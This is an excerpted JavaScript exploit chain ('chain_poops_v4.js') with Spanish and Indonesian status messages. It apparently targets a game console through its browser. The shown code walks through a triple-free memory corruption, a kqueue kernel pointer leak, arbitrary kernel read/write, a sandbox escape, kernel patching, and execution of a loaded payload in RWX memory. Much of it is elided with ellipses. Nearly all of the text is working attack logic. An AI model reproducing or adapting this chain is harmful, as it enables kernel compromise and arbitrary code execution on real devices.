...
// Activadores de las etapas avanzadas
const CFG_DO_MAKE_KARW  = 1;   // 1 = leak kqueue + kernel R/W
const CFG_DO_JAILBREAK  = 1;   // 1 = sandbox escape (necesita make_karw)
const CFG_DO_KPATCH     = 1;   // 1 = kernel patches (necesita jailbreak)
const CFG_DO_PAYLOAD    = 1;   // 1 = cargar payload (necesita kpatch)
// ============================================================
...
function check(name, ok, detail) {
    try {
        if (window.__TM) {
            ...
            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v4.js', line: 0, col: 0, stack: '' });
            if (window.__TM.render) window.__TM.render();
        }
    } catch (e) { }
...
(async function () {
    ...
    try {
        ...
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted + (pairStatus.error ? " error=" + pairStatus.error : ""));
        mark("PRIMITIVE-OK", "");
        ...
        if (!pivotCell || typeof pivotCell.low !== "number" || typeof pivotCell.hi !== "number") {
            mark("PIVOT-CELL-INVALID", "pivotCell=" + pivotCell + " -- primitiva inestable, aborting");
        ...
        sc = function (num) {
            ...
            if (num === undefined || num === null || typeof num !== "number") throw new Error("sc: num is " + num + " args=" + JSON.stringify(a.map(String)));
        ...
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) { burned.add(fd); mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size); }
        }
        ...
        if (workers.length < 1) { mark("TOO-FEW-WORKERS", "only " + workers.length + " survived -- refusing to arm"); state("TOO FEW WORKERS -- reboot and retry", "bad"); return; }
        ...
        async function restoreThreadAttrs(why) {
            ...
            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr);
            ...
            const good = backMask.low === savedMask.low && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar + " rtprio=" + pr + " mask=" + backMask + " prio={" + backPrio + "}");
        ...
        if (!triplets) {
            mark("FAILED-STAGE", "stage=triple-free");
            mark("STEP10-SUMMARY", "committed=" + committed + " reboot=" + rebootRequired + " triplets=none");
            state("Sin triple free -- reboot y reintenta", "bad");
            return;
        }
        mark("STEP10-SUMMARY", "committed=" + committed + " reboot=" + rebootRequired + " triplets=" + triplets.join(","));

        // ============================================================
        // make_karw: leak kqueue → kernel base → kread/kwrite → KernelView
        // ============================================================
            ...
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                ...
                if (leaked) {
                    ...
                    check("kl_lock-kq_fdp-kernel-pointers",
                        (klLock.hi >>> 0) === 0xffffffff && (kqFdp.hi >>> 0) >= 0xffff0000,
        ...
        // Utilidades kread/kwrite via UIO
        ...
        async function kreadSlow(addr, size, pairs) {
            ...
            if (pairs && pairs.length > NUM_UIO_IOV) { mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV); return null; }
        ...
        if (kernelBase && triplets) {
            ...
            if (check("ofiles-walk-reached-pipes", kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData), "")) {
                ...
                if (wrote) {
                    ...
                    check("kernelview-reads-kernel-elf-header", kvViewDv.getUint32(0, true) === 0x464c457f, "");
                    ...
                    if (CFG_DO_PAYLOAD === 1 && payload && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") try {
                        state("payload...", "warn");
                        ...
                        if (entry.hi > 0) {
                            ...
                            check("byte-payload-rwx-memory", bad < 0, bad < 0 ? "" : "mismatch at +" + hx(bad));
                            if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                ...
                                if (agree) {
                                    ...
                                    if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry);
                                }
                            }
                        }
                    } catch (ple) { mark("PAYLOAD-THREW", ple.message || String(ple)); }

                    mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken + " kpatched=" + kpatched + " payload=" + payloadRunning);
        ...
        state(allDone ? "BERHASIL -- Tekan tombol PS untuk keluar"
              ...
              : "Sin triple free -- reboot y reintenta",
